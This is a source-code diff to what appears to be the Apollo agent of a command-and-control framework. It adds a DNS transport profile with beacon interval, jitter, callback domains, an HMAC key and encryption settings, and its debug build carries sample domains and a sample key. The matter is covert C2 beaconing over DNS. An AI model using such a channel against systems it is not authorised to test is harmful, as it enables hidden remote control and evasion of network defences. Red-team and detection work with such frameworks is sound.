@@ -14,6 +14,7 @@ using PSKCryptography;
 using ApolloInterop.Serializers;
 using NamedPipeTransport;
 using TcpTransport;
+using DnsTransport;
 
 namespace Apollo
 {
@@ -57,6 +58,35 @@ namespace Apollo
                         { "domain_front", "domain_front_here" },
                         { "killdate", "killdate_here" },
                         { "USER_AGENT", "USER_AGENT_here" }
+#endif
+                    }
+                }
+            },
+#endif
+#if DNS
+            { "dns", new C2ProfileData()
+                {
+                    TC2Profile = typeof(DnsProfile),
+                    TCryptography = typeof(PSKCryptographyProvider),
+                    TSerializer = typeof(EncryptedJsonSerializer),
+                    Parameters = new Dictionary<string, string>()
+                    {
+#if DEBUG
+                        { "callback_interval", "5" },
+                        { "callback_jitter", "0" },
+                        { "callback_domains", "abc.domain1.com,abc.domain2.com" },
+                        { "msginit", "init" },
+                        { "msgdefault", "default" },
+                        { "hmac_key", "HM4C_K3y@123" },
+                        { "encrypted_exchange_check", "T" }
+#else
+                        { "callback_interval", "callback_interval_here" },
+                        { "callback_jitter", "callback_jitter_here" },
+                        { "callback_domains", "callback_domains_here" },
+                        { "msginit", "msginit_here" },
+                        { "msgdefault", "msgdefault_here" },
+                        { "hmac_key", "hmac_key_here" },
+                        { "encrypted_exchange_check", "encrypted_exchange_check_here" }
 #endif
                     }
                 }
